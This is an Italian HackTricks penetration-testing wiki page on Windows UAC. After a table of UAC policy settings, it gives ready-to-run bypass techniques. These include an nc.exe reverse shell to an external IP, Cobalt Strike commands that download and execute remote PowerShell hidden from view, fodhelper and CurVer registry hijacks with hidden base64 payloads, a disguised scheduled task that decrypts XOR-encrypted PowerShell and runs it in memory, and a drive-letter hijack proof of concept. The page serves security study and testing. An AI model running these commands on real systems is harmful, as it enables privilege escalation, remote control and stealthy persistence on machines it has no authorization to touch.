# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **prompt di consenso per attività elevate**. Le applicazioni hanno diversi livelli di `integrity`, e un programma con un **livello elevato** può eseguire operazioni che **potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e i task sono sempre **eseguiti nel contesto di sicurezza di un account non-amministratore** a meno che un amministratore non autorizzi esplicitamente queste applicazioni/task ad avere accesso di livello amministratore per l'esecuzione. È una funzionalità di convenienza che protegge gli amministratori da modifiche involontarie ma non è considerata un confine di sicurezza.

Per maggiori informazioni sui livelli di integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono forniti 2 token: uno standard, per eseguire azioni ordinarie a livello normale, e uno con i privilegi di amministratore.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) descrive in dettaglio il funzionamento di UAC e include il processo di logon, l'esperienza utente e l'architettura di UAC. Gli amministratori possono utilizzare security policies per configurare come UAC opera specificamente per la loro organizzazione a livello locale (usando secpol.msc), oppure configurarle e distribuirle tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono trattate in dettaglio [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Group Policy che possono essere impostate per UAC. La tabella seguente fornisce ulteriori dettagli:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Le **local security policies** ("secpol.msc" sulla maggior parte dei sistemi) sono configurate di default per **impedire agli utenti non amministratori di eseguire installazioni software**. Questo significa che anche se un utente non amministratore può scaricare l'installer del tuo software, non sarà in grado di eseguirlo senza un account amministratore.

### Registry Keys to Force UAC to Ask for Elevation

Come utente standard senza diritti amministrativi, puoi assicurarti che l'account "standard" venga **richiesto di inserire le credenziali da UAC** quando tenta di eseguire determinate azioni. Questa azione richiederebbe la modifica di determinate **registry keys**, per le quali occorrono permessi amministrativi, a meno che non esista un **UAC bypass**, o l'attaccante sia già loggato come admin.

Anche se l'utente è nel gruppo **Administrators**, queste modifiche costringono l'utente a **reinserire le credenziali del proprio account** per eseguire azioni amministrative.

**L'unico svantaggio è che questo approccio richiede UAC disabilitato per funzionare, cosa improbabile in ambienti di produzione.**

Le chiavi del registro e le voci che devi cambiare sono le seguenti (con i loro valori predefiniti tra parentesi):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Questo può anche essere fatto manualmente tramite lo strumento Local Security Policy. Una volta cambiato, le operazioni amministrative richiedono all'utente di reinserire le proprie credenziali.

### Note

**User Account Control non è un confine di sicurezza.** Pertanto, gli utenti standard non possono evadere dai loro account e ottenere i diritti di amministratore senza un local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegi UAC

- Internet Explorer Protected Mode utilizza controlli di integrità per impedire ai processi con livello di integrità elevato (come i browser web) di accedere a dati con livello di integrità basso (come la cartella dei file temporanei di Internet). Questo viene fatto eseguendo il browser con un token a bassa integrità. Quando il browser tenta di accedere a dati memorizzati nella zona a bassa integrità, il sistema operativo verifica il livello di integrità del processo e consente l'accesso di conseguenza. Questa funzionalità aiuta a prevenire che attacchi di remote code execution ottengano accesso a dati sensibili sul sistema.
- Quando un utente effettua il logon su Windows, il sistema crea un token di accesso che contiene un elenco dei privilegi dell'utente. I privilegi sono definiti come la combinazione dei diritti e delle capacità di un utente. Il token contiene anche un elenco delle credenziali dell'utente, ovvero le credenziali utilizzate per autenticare l'utente al computer e alle risorse sulla rete.

### Autoadminlogon

Per configurare Windows in modo che effettui automaticamente il logon di un utente specifico all'avvio, impostare la chiave di registro **`AutoAdminLogon`**. Questo è utile per ambienti kiosk o per scopi di testing. Utilizzalo solo su sistemi sicuri, poiché espone la password nel registro.

Imposta le seguenti chiavi usando l'Editor del Registro o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Per ripristinare il comportamento di logon normale, impostare `AutoAdminLogon` a 0.

## UAC bypass

> [!TIP]
> Nota che se hai accesso grafico alla vittima, UAC bypass è semplice poiché puoi semplicemente cliccare su "Yes" quando appare il prompt UAC

Il bypass di UAC è necessario nella seguente situazione: **UAC è attivato, il tuo processo è in esecuzione in un contesto di integrità media, e il tuo utente appartiene al gruppo Administrators**.

È importante menzionare che è **molto più difficile bypassare l'UAC se è impostato al livello di sicurezza più alto (Always) rispetto a qualsiasi altro livello (Default).**

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**) puoi **eseguire una reverse shell con privilegi admin** (livello di integrità alto) usando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** elementare UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente che appartiene al gruppo Administrators puoi **montare la condivisione C$** tramite SMB (file system) localmente come un nuovo disco e avrai **accesso a tutto il file system** (anche alla cartella home di Administrator).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con cobalt strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al suo livello di sicurezza massimo.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** hanno anche diversi moduli per il **bypass** della **UAC**.

### KRBUACBypass

Documentazione e tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) che è una **compilation** di diversi exploit di bypass UAC. Nota che sarà necessario **compile UACME using visual studio or msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`) , dovrai sapere **quale ti serve.**\
Devi **fare attenzione** perché alcuni bypass mostreranno dei **prompt** di altri programmi che **avviseranno** l'**utente** che qualcosa sta succedendo.

UACME indica la **versione build da cui ogni tecnica ha iniziato a funzionare**. Puoi cercare una tecnica che interessi le tue versioni:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) ottieni la release di Windows `1607` dalle versioni di build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Il trusted binary `fodhelper.exe` viene auto-elevato nelle versioni moderne di Windows. Quando viene avviato, interroga il seguente percorso del registro per utente senza validare il verbo `DelegateExecute`. Inserire un comando lì permette a un processo Medium Integrity (l'utente è in Administrators) di avviare un processo High Integrity senza un prompt UAC.

Percorso del registro interrogato da fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell steps (imposta il tuo payload, poi trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Note:
- Funziona quando l'utente corrente è membro del gruppo Administrators e il livello UAC è default/lenient (non Always Notify con restrizioni extra).
- Usare il percorso `sysnative` per avviare un 64-bit PowerShell da un processo a 32-bit su 64-bit Windows.
- Il payload può essere qualsiasi comando (PowerShell, cmd o un percorso EXE). Evitare UI di prompt per stealth.

#### CurVer/extension hijack variant (HKCU only)

Esempi recenti che abusano di `fodhelper.exe` evitano `DelegateExecute` e invece **reindirizzano il ProgID `ms-settings`** tramite il valore per-utente `CurVer`. Il binario auto-elevato risolve comunque l'handler sotto `HKCU`, quindi non è necessario un token admin per impostare le chiavi:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una volta elevato, il malware comunemente **disabilita i prompt futuri** impostando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` su `0`, quindi esegue ulteriori defense evasion (ad es., `Add-MpPreference -ExclusionPath C:\ProgramData`) e ricrea la persistence per eseguire con integrità elevata. Un tipico task di persistenza memorizza un **XOR-encrypted PowerShell script** su disco e lo decodifica/esegue in memoria ogni ora:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Questa variante pulisce comunque il dropper e lascia solo i staged payloads, rendendo il rilevamento dipendente dal monitoraggio del `CurVer` hijack, dalla manomissione di `ConsentPromptBehaviorAdmin`, dalla creazione di Defender exclusions o da scheduled tasks che decriptano PowerShell in memoria.

#### Altri bypass UAC

**Tutte** le tecniche usate qui per bypassare UAC **richiedono** una **shell interattiva completa** con la vittima (una normale nc.exe shell non è sufficiente).

Puoi ottenerla usando una sessione **meterpreter**. Migra in un **process** che ha il valore **Session** uguale a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### Bypass UAC con GUI

Se hai accesso a una **GUI** puoi semplicemente accettare la prompt UAC quando la ricevi, non hai realmente bisogno di un bypass. Quindi, ottenere accesso a una GUI ti permetterà di bypassare UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente via RDP) ci sono **alcuni tool che verranno eseguiti come administrator** dai quali potresti **lanciare** un **cmd**, per esempio, **come admin** direttamente senza essere nuovamente richiesto da UAC, come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo può risultare un po' più **stealthy**.

### Bypass UAC rumoroso (brute-force)

Se non ti importa essere rumoroso puoi sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) che **chiede di elevare i permessi finché l'utente non li accetta**.

### Il tuo bypass - Metodologia base per bypass UAC

Se dai un'occhiata a **UACME** noterai che **la maggior parte dei bypass UAC sfrutta una vulnerabilità di Dll Hijacking** (principalmente scrivendo la dll malevola in _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binario che farà **autoelevate** (verifica che quando viene eseguito giri a un high integrity level).
2. Con procmon trova eventi "**NAME NOT FOUND**" che possono essere vulnerabili a **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL in alcuni **percorsi protetti** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi bypassare questo usando:
   1. **wusa.exe**: Windows 7, 8 e 8.1. Permette di estrarre il contenuto di un file CAB dentro percorsi protetti (perché questo tool viene eseguito a high integrity level).
   2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL nel percorso protetto ed eseguire il binario vulnerabile e autoelevato.

### Un'altra tecnica di bypass UAC

Consiste nel verificare se un **autoElevated binary** tenta di **leggere** dal **registry** il **nome/percorso** di un **binary** o di un **command** da **eseguire** (questo è più interessante se il binario cerca queste informazioni dentro **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” usa shadow-admin tokens con mappe per-sessione `\Sessions\0\DosDevices/<LUID>`. La directory viene creata in modo lazy da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l'attaccante impersona lo shadow-admin token solo a livello di **SecurityIdentification**, la directory viene creata con l'attaccante come **owner** (eredita `CREATOR OWNER`), permettendo link di drive-letter che hanno priorità su `\GLOBAL??`.

Passaggi:

1. Da una sessione a basso privilegio, chiama `RAiProcessRunOnce` per lanciare uno runonce.exe shadow-admin senza prompt.
2. Duplica il suo primary token in un **identification** token e impersonalo mentre apri `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` sotto la proprietà dell'attaccante.
3. Crea un symlink `C:` lì puntando a storage controllato dall'attaccante; gli accessi al filesystem successivi in quella sessione risolveranno `C:` nel percorso controllato dall'attaccante, abilitando DLL/file hijack senza prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Riferimenti
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
